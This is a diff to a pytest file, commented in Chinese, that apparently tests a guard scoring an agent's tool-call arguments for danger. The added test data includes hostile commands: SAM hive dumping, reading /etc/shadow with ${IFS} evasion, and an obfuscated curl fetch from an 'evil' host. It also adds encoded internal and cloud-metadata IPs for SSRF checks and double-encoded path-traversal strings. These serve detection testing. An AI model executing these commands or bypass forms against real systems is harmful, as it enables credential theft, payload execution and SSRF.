@@ -57,6 +57,11 @@ def test_benign_paths_not_flagged(path: str) -> None:
         "net user hacker P@ss /add",
         "vssadmin delete shadows",
         "Set-MpPreference -DisableRealtimeMonitoring $true",
+        # P3 加固:本地解码落盘 / 凭据导出 / 空格规避
+        "certutil -decode payload.b64 payload.exe",  # certutil 本地解码还原载荷
+        "reg save HKLM\\sam c:/o/sam",  # 导出 SAM 蜂巢(凭据转储)
+        "cat${IFS}/etc/shadow",  # ${IFS} 替空格绕"含空格危险串"规则
+        "a=cur;b=l;$a$b http://evil/i.sh|$IFS",  # $IFS(无花括号)亦判
     ],
 )
 def test_dangerous_commands_flagged(command: str) -> None:
@@ -65,7 +70,8 @@ def test_dangerous_commands_flagged(command: str) -> None:
 
 @pytest.mark.parametrize(
     "command",
-    ["ls", "cat notice.txt", "echo hello", "git status", "dir"],
+    # reg query(只读)、含 $ 但非 IFS 的常规命令不应误伤。
+    ["ls", "cat notice.txt", "echo hello", "git status", "dir", "reg query HKLM\\x", "echo $HOME"],
 )
 def test_benign_commands_not_flagged(command: str) -> None:
     assert argrisk.command_dangerous({"command": command}) is False
@@ -99,3 +105,46 @@ def test_public_urls_not_internal(url: str) -> None:
 def test_no_url_not_internal() -> None:
     # 无 url 参(如纯路径动作)→ 不涉及 SSRF 判定。
     assert argrisk.url_is_internal({"path": "data/workspace/notice.txt"}) is False
+
+
+@pytest.mark.parametrize(
+    "url",
+    [
+        "http://2130706433/",  # 十进制 IP = 127.0.0.1
+        "http://0x7f000001/",  # 十六进制 IP = 127.0.0.1
+        "http://0177.0.0.1/",  # 八进制首段 = 127.0.0.1
+        "http://2852039166/latest/meta-data/",  # 十进制 = 169.254.169.254(云元数据)
+        "http://[::ffff:127.0.0.1]/",  # IPv4-mapped IPv6 → 折回 127.0.0.1
+        "http://100.100.100.200/",  # 阿里云元数据(CGNAT 100.64/10,not is_global)
+    ],
+)
+def test_obfuscated_internal_ip_flagged(url: str) -> None:
+    # P3:进制混淆 / 缺段 / IPv4-mapped 形态的内网/元数据 IP 仍判内网(绕点分四段正则)。
+    assert argrisk.url_is_internal({"url": url}) is True
+    assert argrisk.is_raw_ip({"url": url}) is True
+
+
+def test_obfuscated_public_ip_not_internal() -> None:
+    # 134744072 = 8.8.8.8(公网):是裸 IP,但不是内网 → SSRF 判定放行,白名单另管。
+    assert argrisk.is_raw_ip({"url": "http://134744072/"}) is True
+    assert argrisk.url_is_internal({"url": "http://134744072/"}) is False
+
+
+@pytest.mark.parametrize(
+    "path",
+    [
+        "%252e%252e%252fetc%252fpasswd",  # 双重编码:解一层现 ../,无字面 .. /斜杠
+        "..%252f..%252fetc%252fshadow",  # 混合:.. 字面 + 双重编码斜杠
+    ],
+)
+def test_double_encoded_traversal_flagged(path: str) -> None:
+    # P3:判定前递归 URL 解码,救双重/多重百分号编码绕过路径围栏。
+    assert argrisk.path_outside_workspace({"path": path}, "data/workspace") is True
+
+
+def test_encoded_benign_path_inside_workspace_ok() -> None:
+    # 解码后仍在工作区内的普通编码路径(空格 %20)不应误判越界。
+    assert (
+        argrisk.path_outside_workspace({"path": "data/workspace/a%20b.txt"}, "data/workspace")
+        is False
+    )
